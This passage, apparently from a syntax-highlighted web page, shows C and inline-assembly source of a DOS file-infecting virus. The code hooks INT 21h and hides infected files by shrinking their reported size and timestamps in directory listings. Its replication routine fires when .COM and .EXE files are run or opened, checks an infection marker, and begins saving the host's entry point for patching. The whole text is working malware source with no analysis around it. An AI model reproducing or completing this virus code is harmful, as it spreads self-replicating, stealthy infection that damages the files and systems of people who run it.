      </span><span class="sc11">mov</span><span class="sc0"> </span><span class="sc11">es</span><span class="sc10">,</span><span class="sc11">ax</span><span class="sc0">
      </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc11">ax</span><span class="sc0">
      </span><span class="sc11">mov</span><span class="sc0"> </span><span class="sc11">si</span><span class="sc10">,</span><span class="sc4">0feh</span><span class="sc0">
      </span><span class="sc11">cmpsw</span><span class="sc0">
      </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc11">si</span><span class="sc0">
      </span><span class="sc11">xor</span><span class="sc0"> </span><span class="sc11">ax</span><span class="sc10">,</span><span class="sc11">ax</span><span class="sc0">
      </span><span class="sc11">retf</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">// Get virus length
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">get_virus_size</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">asm</span><span class="sc0"> </span><span class="sc11">lea</span><span class="sc0"> </span><span class="sc11">ax</span><span class="sc10">,</span><span class="sc11">virus_end</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">asm</span><span class="sc0"> </span><span class="sc11">sub</span><span class="sc0"> </span><span class="sc11">ax</span><span class="sc10">,</span><span class="sc19">offset</span><span class="sc0"> </span><span class="sc11">virus_start</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">_AX</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">0x80</span><span class="sc10">;</span><span class="sc0">           </span><span class="sc2">// reserve some extra space
</span><span class="sc0">    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">_AX</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">// Get virus memory length
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">get_virus_memory</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">get_virus_size</span><span class="sc10">());</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">// Get virus size in paragraphs
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">get_virus_paragraphs</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">get_virus_size</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">// Resident INT 21h handler
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">interrupt</span><span class="sc0"> </span><span class="sc11">int_21_handler</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">bp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">di</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">si</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ds</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">es</span><span class="sc10">,</span><span class="sc0">
                              </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">dx</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">cx</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">bx</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ax</span><span class="sc10">,</span><span class="sc0">
                              </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ip</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">cs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">flags</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">temp</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">far</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ch</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">exe_header</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">exe_hdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">handle</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">stats</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">filelength</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">ne_offset</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">ldiv_t</span><span class="sc0"> </span><span class="sc11">lx</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">findrec</span><span class="sc0"> </span><span class="sc11">searchdtarec</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">dirrec</span><span class="sc0"> </span><span class="sc11">searchdirrec</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">ftime</span><span class="sc0"> </span><span class="sc11">filedate</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">[</span><span class="sc4">128</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc6">"This space is reserved for holding the "</span><span class="sc0"> \
                                  </span><span class="sc6">"filename for internal use only! ;-) "</span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">segp</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nread</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// Installation check
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">ax</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">PING</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bx</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">PONG</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">temp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ax</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">ax</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">bx</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">bx</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">temp</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc2">// File execute
</span><span class="sc0">    </span><span class="sc11">temp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ax</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc2">// FCB FindFirst/FindNext
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">temp</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x11</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x12</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">_DS</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ds</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">_DX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">dx</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">_AX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ax</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">asm</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">pushf</span><span class="sc0">
            </span><span class="sc11">call</span><span class="sc0"> </span><span class="sc11">dword</span><span class="sc0"> </span><span class="sc19">ptr</span><span class="sc0"> </span><span class="sc11">cs</span><span class="sc10">:[</span><span class="sc11">old_int_21</span><span class="sc10">]</span><span class="sc0">
            </span><span class="sc11">or</span><span class="sc0"> </span><span class="sc11">al</span><span class="sc10">,</span><span class="sc11">al</span><span class="sc0">
            </span><span class="sc11">jz</span><span class="sc0"> </span><span class="sc11">fcb_ok</span><span class="sc0">
            </span><span class="sc11">jmp</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">fcb_ok</span><span class="sc10">:</span><span class="sc0">
        </span><span class="sc11">asm</span><span class="sc0"> </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc11">ax</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">searchdirrec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">getdta</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">searchdirrec</span><span class="sc10">-&gt;</span><span class="sc11">db_drive</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0xff</span><span class="sc10">)</span><span class="sc0">
           </span><span class="sc11">searchdirrec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">getdta</span><span class="sc10">()+</span><span class="sc4">7</span><span class="sc10">;</span><span class="sc0">           </span><span class="sc2">// extended fcb
</span><span class="sc0">        </span><span class="sc11">temp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">searchdirrec</span><span class="sc10">-&gt;</span><span class="sc11">db_time</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x1f</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc2">// get seconds
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">30</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">                       </span><span class="sc2">// 60? (vienna shit)
</span><span class="sc0">          </span><span class="sc11">searchdirrec</span><span class="sc10">-&gt;</span><span class="sc11">db_filesize</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc11">virus_stealth_size</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">// substract virus
</span><span class="sc0">          </span><span class="sc11">searchdirrec</span><span class="sc10">-&gt;</span><span class="sc11">db_time</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">;</span><span class="sc0">                      </span><span class="sc2">// and time :-)
</span><span class="sc0">        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">asm</span><span class="sc0"> </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">ax</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc2">// DOS FindFirst/FindNext
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">temp</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x4e</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x4f</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">_DS</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ds</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">_DX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">dx</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">_CX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">cx</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">_AX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ax</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">asm</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">pushf</span><span class="sc0">
            </span><span class="sc11">call</span><span class="sc0"> </span><span class="sc11">dword</span><span class="sc0"> </span><span class="sc19">ptr</span><span class="sc0"> </span><span class="sc11">cs</span><span class="sc10">:[</span><span class="sc11">old_int_21</span><span class="sc10">]</span><span class="sc0">
            </span><span class="sc11">jc</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">asm</span><span class="sc0"> </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc11">ax</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">searchdtarec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">getdta</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc11">temp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">searchdtarec</span><span class="sc10">-&gt;</span><span class="sc11">ff_ftime</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x1f</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">30</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">                       </span><span class="sc2">// 60 seconds again?
</span><span class="sc0">          </span><span class="sc11">searchdtarec</span><span class="sc10">-&gt;</span><span class="sc11">ff_fsize</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc11">virus_stealth_size</span><span class="sc10">;</span><span class="sc0">     </span><span class="sc2">// yups, hide virus
</span><span class="sc0">          </span><span class="sc11">searchdtarec</span><span class="sc10">-&gt;</span><span class="sc11">ff_ftime</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">;</span><span class="sc0">                     </span><span class="sc2">// and seconds
</span><span class="sc0">        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">asm</span><span class="sc0"> </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">ax</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">error</span><span class="sc10">:</span><span class="sc0">
        </span><span class="sc11">asm</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">mov</span><span class="sc0"> </span><span class="sc11">sp</span><span class="sc10">,</span><span class="sc11">bp</span><span class="sc0">
            </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">bp</span><span class="sc0">
            </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">di</span><span class="sc0">
            </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">si</span><span class="sc0">
            </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">ds</span><span class="sc0">
            </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">es</span><span class="sc0">
            </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">dx</span><span class="sc0">
            </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">cx</span><span class="sc0">
            </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">bx</span><span class="sc0">
            </span><span class="sc11">add</span><span class="sc0"> </span><span class="sc11">sp</span><span class="sc10">,</span><span class="sc4">2</span><span class="sc0">
            </span><span class="sc11">clc</span><span class="sc0">
            </span><span class="sc11">or</span><span class="sc0"> </span><span class="sc11">al</span><span class="sc10">,</span><span class="sc11">al</span><span class="sc0">
            </span><span class="sc11">jz</span><span class="sc0"> </span><span class="sc11">no_stc</span><span class="sc0">
            </span><span class="sc11">stc</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">no_stc</span><span class="sc10">:</span><span class="sc0">
        </span><span class="sc11">asm</span><span class="sc0"> </span><span class="sc11">retf</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">ax</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x4b00</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ax</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x3d00</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ax</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x4300</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ax</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x6c00</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc2">// replication part, invoced on execute, open, attrib and extopen
</span><span class="sc0">        </span><span class="sc11">_DS</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_CS</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">nread</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">ch</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MK_FP</span><span class="sc10">(</span><span class="sc11">ds</span><span class="sc10">,</span><span class="sc11">dx</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ax</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x6c00</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ch</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MK_FP</span><span class="sc10">(</span><span class="sc11">ds</span><span class="sc10">,</span><span class="sc11">si</span><span class="sc10">);</span><span class="sc0">    </span><span class="sc2">// handle extopen ds:si &gt; ds:dx
</span><span class="sc0">        </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">                                    </span><span class="sc2">// copy and upcase filename
</span><span class="sc0">          </span><span class="sc11">filename</span><span class="sc10">[</span><span class="sc11">nread</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">toupper</span><span class="sc10">(*</span><span class="sc11">ch</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">nread</span><span class="sc10">++;</span><span class="sc0">
          </span><span class="sc11">ch</span><span class="sc10">++;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">[</span><span class="sc11">nread</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">_DS</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_CS</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">_ES</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_CS</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc6">".COM"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">        </span><span class="sc2">// com extension?
</span><span class="sc0">            </span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc6">".EXE"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">        </span><span class="sc2">// exe extension?
</span><span class="sc0">          </span><span class="sc11">handle</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_open</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc11">O_RDWR</span><span class="sc10">);</span><span class="sc0">              </span><span class="sc2">// open file
</span><span class="sc0">          </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">                           </span><span class="sc2">// no error?
</span><span class="sc0">            </span><span class="sc11">getftime</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">filedate</span><span class="sc10">);</span><span class="sc0">                </span><span class="sc2">// store filedate/time
</span><span class="sc0">            </span><span class="sc11">_read</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">org4bytes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x4</span><span class="sc10">);</span><span class="sc0">              </span><span class="sc2">// read 4 bytes
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">org4bytes</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'M'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">org4bytes</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'Z'</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">// EXE file
</span><span class="sc0">                </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc4">0L</span><span class="sc10">,</span><span class="sc11">SEEK_SET</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">_read</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,&amp;</span><span class="sc11">exe_buffer</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">exe_buffer</span><span class="sc10">));</span><span class="sc0">   </span><span class="sc2">// read header
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">exe_buffer</span><span class="sc10">.</span><span class="sc11">exe_overlay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">            </span><span class="sc2">// no overlay?
</span><span class="sc0">                    </span><span class="sc10">(</span><span class="sc11">exe_buffer</span><span class="sc10">.</span><span class="sc11">exe_crc</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0x29A</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">            </span><span class="sc2">// not infected?
</span><span class="sc0">                    </span><span class="sc11">ne_offset</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">exe_buffer</span><span class="sc10">.</span><span class="sc11">exe_offset_NE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">filelength</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc4">0L</span><span class="sc10">,</span><span class="sc11">SEEK_END</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">lx</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ldiv</span><span class="sc10">(</span><span class="sc11">filelength</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x200</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">lx</span><span class="sc10">.</span><span class="sc11">quot</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ne_offset</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ne_offset</span><span class="sc10">=</span><span class="sc11">filelength</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">filelength</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">ne_offset</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
                       </span><span class="sc10">(</span><span class="sc11">exe_buffer</span><span class="sc10">.</span><span class="sc11">exe_ofs_reloc</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0x60</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
                       </span><span class="sc10">((</span><span class="sc11">WORD</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">lx</span><span class="sc10">.</span><span class="sc11">quot</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">exe_buffer</span><span class="sc10">.</span><span class="sc11">exe_pages</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
                       </span><span class="sc10">((</span><span class="sc11">WORD</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">lx</span><span class="sc10">.</span><span class="sc11">rem</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">exe_buffer</span><span class="sc10">.</span><span class="sc11">exe_last_page</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc2">// ok, no overlays, and no windows exe (strange check)
</span><span class="sc0">                        </span><span class="sc2">// now store original stack and entrypoint
</span><span class="sc0">                        </span><span class="sc11">host_ss</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">exe_buffer</span><span class="sc10">.</span><span class="sc11">exe_SS</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">host_sp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">exe_buffer</span><span class="sc10">.</span><span class="sc11">exe_SP</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">host_cs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">exe_buffer</span><span class="sc10">.</span><span class="sc11">exe_CS</span><span class="sc10">;</span><span class="sc0">
